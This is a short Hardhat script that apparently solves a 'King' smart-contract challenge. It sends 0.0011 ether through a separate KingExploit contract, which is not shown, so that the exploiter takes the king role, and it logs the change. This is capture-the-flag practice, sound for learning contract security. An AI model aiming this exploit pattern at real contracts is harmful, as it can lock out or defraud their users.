import { BigNumber } from "ethers"
import { ethers } from "hardhat"

import { KING, KINGEXPLOIT } from "../constants"
import { King, KingExploit } from "../typechain-types"

const forceExploit = async () => {
    const amount = ethers.utils.parseEther("0.0011")

    const king: King = await ethers.getContractAt("King", KING)
    const kingExploiter: KingExploit = await ethers.getContractAt("KingExploit", KINGEXPLOIT)
    console.log("king before transfer", await king._king())

    // sending funds to king -> changes king to king exploiter
    const tx = await kingExploiter.sendFunds(KING, amount)
    await tx.wait(1)
    console.log("king after transfer", await king._king())
    console.log("this should be same as kingExploit address: ", kingExploiter.address)
}

forceExploit()
    .then(() => {
        console.log("king exploited successfully")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
